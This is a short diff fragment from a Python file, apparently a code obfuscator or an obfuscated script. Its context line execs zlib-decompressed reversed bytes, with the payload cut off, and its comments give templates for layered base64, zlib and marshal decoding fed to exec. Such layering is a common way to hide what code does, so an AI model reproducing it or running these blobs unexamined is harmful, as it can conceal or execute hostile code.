@@ -495,7 +495,7 @@ _ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(b'o\xab\x8a\xb3
 #__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
 #exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
 #__import__('base64').b32decode(__[::-1])
-#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))
 #exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
 #__import__('base64').b32decode(__[::-1])
 #exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
